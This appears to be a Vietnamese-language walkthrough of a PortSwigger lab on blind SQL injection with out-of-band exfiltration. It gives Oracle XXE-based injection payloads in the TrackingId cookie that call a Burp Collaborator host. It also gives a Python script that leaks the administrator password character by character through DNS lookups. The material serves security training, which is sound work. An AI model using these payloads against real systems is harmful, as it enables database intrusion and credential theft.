![[sqli-oast-exfil.png]]
-mô tả lab: TrackingId blind hoàn toàn (true/false không khác gì nhau), nhưng DB ra được internet. Mình exfil password administrator qua DNS lookup về Collaborator. Nâng cao của bài blind boolean.

> [!NOTE]
> -Lab: https://portswigger.net/web-security/sql-injection/blind/lab-out-of-band-data-exfiltration
> -cần Burp Collaborator (copy payload domain xxx.oastify.com)

### hướng giải
- [ ] mình thử `TrackingId=x' AND '1'='1` vs `'1'='2`, sau đó quan sát 2 gói tin này, mình thấy response giống hệt nhau -> boolean chết
- [ ] mình thử `'; SELECT pg_sleep(10)--` thì delay cũng không rõ (hoặc DB không phải Postgres / time bị jitter)
- [ ] mình thử payload DNS `'; SELECT EXTRACTVALUE(xmltype('<%doc>...'))...` trỏ về collaborator, mình thấy có hit về -> DB ra internet được, Oracle/MSSQL hỗ trợ exfil qua DNS
- [ ] => mình exfil từng ký tự password bằng cách nhét ký tự vào subdomain: `password[1].collab...` rồi đọc log

### giải
-bước 1: confirm OAST với payload Oracle (lab này dùng Oracle):
```
TrackingId: x'||(SELECT EXTRACTVALUE(xmltype('<?xml version="1.0" encoding="UTF-8"?><!DOCTYPE root [ <!ENTITY % remote SYSTEM "http://COLLAB.oastify.com/"> %remote;]>'),'/l') FROM dual)--
```
![[sqli-oast-hit.png]]
-thấy DNS hit về collaborator là chắc chắn inject được + exfil được.

-bước 2: exfil password administrator từng ký tự (script python của mình):
```python
import requests
base = "https://LAB-ID.web-security-academy.net"
collab = "COLLAB.oastify.com"
s = requests.Session()
charset = "abcdefghijklmnopqrstuvwxyz0123456789"
pw = ""
for pos in range(1, 30):
    for c in charset:
        payload = (f"x'||(SELECT EXTRACTVALUE(xmltype('<?xml version=\"1.0\"?>"
                   f"<!DOCTYPE root [ <!ENTITY % r SYSTEM \"http://{pw+c}.{pos}.{collab}/\"> %r;]>'),'/l') FROM users WHERE username='administrator' AND SUBSTR(password,{pos},1)='{c}')--")
        s.get(base + "/filter?category=Gifts", cookies={"TrackingId": payload}, timeout=20)
    # mình poll collaborator: subdomain nào có hit thì đó là ký tự đúng, vd "a.5.collab..." hit -> pos5='a'
```
-sau khi quan sát log collaborator này, mình ghép lại được full password, vd `administrator:SECRET...`.

-bước 3: login `administrator:SECRET...` là solve.

> [!NOTE]
> -bài học của mình: blind mà boolean/time đều chết thì nghĩ ngay OAST. DNS exfil chậm nhưng chắc ăn, mỗi ký tự 1 hit.
> -mẹo của mình: luôn confirm OAST bằng 1 hit đơn trước, rồi mới chạy vòng exfil, không là brute mù tốn thời gian.
